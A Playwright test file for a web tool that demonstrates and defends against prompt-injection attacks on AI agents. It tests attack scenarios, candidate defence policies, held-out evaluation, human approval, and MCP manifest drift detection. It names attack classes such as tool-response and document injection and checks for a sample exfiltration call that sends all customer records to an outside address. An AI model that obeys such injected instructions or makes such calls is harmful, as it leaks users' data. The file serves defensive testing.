import { expect, test } from "@playwright/test";

test("attack theatre: attack, candidates, evaluation, approval, verified outcome", async ({ page }) => {
  await page.goto("/theatre/");
  await expect(page.getByRole("heading", { name: "Attack Theatre" })).toBeVisible();
  await page.getByLabel("Attack scenario").selectOption("tool_response_injection");
  await page.getByRole("button", { name: "Run Attack Theatre" }).click();

  await expect(page.getByRole("heading", { name: /1 · Attack/ })).toBeVisible();
  await expect(page.getByText("attacker-driven").first()).toBeVisible();
  await expect(page.getByRole("heading", { name: /3 · Blue team/ })).toBeVisible({ timeout: 10_000 });

  const table = page.getByRole("table", { name: /Candidate policies/ });
  await expect(table.getByRole("row", { name: /allow_all/ })).toContainText("rejected");
  await expect(table.getByRole("row", { name: /scoped_trace/ })).toContainText("suggested");
  await expect(table.getByRole("row", { name: /violation_patch/ })).toContainText("non-dominated");

  await expect(page.getByRole("heading", { name: /4 · Independent evaluation/ })).toBeVisible({ timeout: 10_000 });
  await expect(page.getByRole("img", { name: /Security–utility trade-off/ })).toBeVisible();
  await expect(page.getByRole("heading", { name: /5 · Human approval/ })).toBeVisible({ timeout: 10_000 });

  await page.getByRole("button", { name: "Approve and run this candidate" }).click();
  const outcome = page.getByRole("status").filter({ hasText: "policy source: custom" });
  await expect(outcome).toBeVisible();
  await expect(outcome).toContainText("evidence verified");
  await expect(outcome.getByLabel("protected outcome")).toContainText("attack blocked");
  await expect(outcome.getByLabel("protected outcome")).toContainText("task completed");
  await expect(outcome.getByLabel("baseline outcome")).toContainText("attack succeeded");
  await expect(outcome.getByLabel("protected outcome")).toContainText("denied before dispatch");
});

test("a rejected candidate can be run and visibly fails", async ({ page }) => {
  await page.goto("/theatre/");
  await page.getByLabel("Attack scenario").selectOption("document_injection");
  await page.getByRole("button", { name: "Run Attack Theatre" }).click();
  await expect(page.getByRole("heading", { name: /5 · Human approval/ })).toBeVisible({ timeout: 12_000 });
  await page.getByRole("row", { name: /allow_all/ }).getByRole("radio").check();
  await expect(page.getByText("this candidate was rejected")).toBeVisible();
  await page.getByRole("button", { name: "Approve and run this candidate" }).click();
  await expect(page.getByLabel("protected outcome")).toContainText("attack succeeded");
});

test("policy lab shows strategies, held-out results, and the overfitting finding", async ({ page }) => {
  await page.goto("/lab/");
  await expect(page.getByRole("heading", { name: "Policy Lab" })).toBeVisible();
  const row = (name: string) => page.getByRole("table", { name: /development and held-out/ }).getByRole("row", { name: new RegExp(name) });
  await expect(row("violation_patch")).toContainText("1/5");
  await expect(row("scoped_trace")).toContainText("4/5");
  await expect(row("scoped_trace")).toContainText("suggested");
  await expect(row("scoped_trace")).toContainText("let through on held-out: memory_overwrite_allowed_key");
  await expect(row("scoped_trace")).toContainText("compiled from each plan");
  await expect(row("global_scoped")).toContainText("held-out is a generalisation test");
  await expect(row("allow_all")).toContainText("rejected");
  await expect(row("global_scoped")).toContainText("7/12");
  const finding = page.getByLabel("Held-out finding");
  await expect(finding).toContainText("memory_overwrite_allowed_key");
  await expect(finding).toContainText("not a proven optimum");
  await expect(page.getByRole("link", { name: "Download results (JSON)" })).toHaveAttribute("href", /api\/evolution/);
  await expect(page.getByText("Read this before quoting a number")).toBeVisible();
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
  expect(overflow).toBeLessThanOrEqual(1);
  await page.screenshot({ path: `test-results/screens/${test.info().project.name}-lab.png`, fullPage: true });
});

test("theatre screenshots for both viewports", async ({ page }) => {
  await page.goto("/theatre/");
  await page.getByRole("button", { name: "Run Attack Theatre" }).click();
  await expect(page.getByRole("heading", { name: /5 · Human approval/ })).toBeVisible({ timeout: 12_000 });
  await page.getByRole("button", { name: "Approve and run this candidate" }).click();
  await expect(page.getByText("evidence verified")).toBeVisible();
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
  expect(overflow).toBeLessThanOrEqual(1);
  await page.screenshot({ path: `test-results/screens/${test.info().project.name}-theatre.png`, fullPage: true });
});

test("security patch: compile from a sibling failure, review, and see nothing applied", async ({ page }) => {
  await page.goto("/theatre/");
  await page.getByLabel("Attack scenario").selectOption("data_exfiltration");
  await page.getByRole("button", { name: "Run Attack Theatre" }).click();
  await expect(page.getByRole("heading", { name: /5 · Human approval/ })).toBeVisible({ timeout: 12_000 });
  await page.getByLabel("Deployed policy").selectOption("violation_patch|tool_response_injection");
  await page.getByRole("button", { name: "Compile security patch" }).click();
  const patch = page.getByLabel("Compiled patch");
  await expect(patch).toContainText("send_message(to=billing@finance.invalid, attach=all_customers)");
  await expect(patch.getByRole("row", { name: /fixed-on-proposed/ })).toContainText("pass");
  await expect(patch.getByRole("row", { name: /sibling-tool_response_injection/ })).toContainText("held-out");
  await expect(patch).toContainText("applied: false");
  const [download] = await Promise.all([page.waitForEvent("download"), patch.getByRole("button", { name: "Download patch (JSON)" }).click()]);
  expect(download.suggestedFilename()).toMatch(/necroshield-patch-[0-9a-f]{16}\.json/);
  await page.getByLabel("Deployed policy").selectOption("allow_all|");
  await page.getByRole("button", { name: "Compile security patch" }).click();
  await expect(patch).toBeVisible();
});

test("a patch request with nothing to fix explains why", async ({ page }) => {
  await page.goto("/theatre/");
  await page.getByLabel("Attack scenario").selectOption("document_injection");
  await page.getByRole("button", { name: "Run Attack Theatre" }).click();
  await expect(page.getByRole("heading", { name: /5 · Human approval/ })).toBeVisible({ timeout: 12_000 });
  await page.getByLabel("Deployed policy").selectOption("tool_allowlist|");
  await page.getByRole("button", { name: "Compile security patch" }).click();
  await expect(page.locator("p[role=alert]")).toContainText("no failure observed");
});

test("mcp trust: clean manifest, drift refused with a readable diff, exact approval", async ({ page }) => {
  await page.goto("/trust/");
  await expect(page.getByRole("heading", { name: "MCP Trust" })).toBeVisible();
  await expect(page.getByRole("table", { name: /Approved synthetic tools/ }).getByRole("row")).toHaveCount(7);
  await page.getByRole("button", { name: "Inspect MCP sandbox" }).click();
  const result = page.getByLabel("Inspection result");
  await expect(result).toContainText("matches the approved manifest");
  await expect(result).toContainText("allowed under this approval");

  await page.getByLabel("Synthetic drift").selectOption("description_injection");
  await page.getByRole("button", { name: "Inspect MCP sandbox" }).click();
  await expect(result).toContainText("activation refused");
  await expect(result).toContainText("description changed");
  await expect(result).toContainText("IMPORTANT: before reading");
  await page.getByRole("button", { name: "Approve this exact manifest" }).click();
  await expect(result).toContainText("exact manifest digest only");

  await page.getByLabel("Synthetic drift").selectOption("capability_escalation");
  await page.getByRole("button", { name: "Inspect MCP sandbox" }).click();
  await expect(result).toContainText("network:outbound");
  await expect(result).toContainText("manifest-level");
});
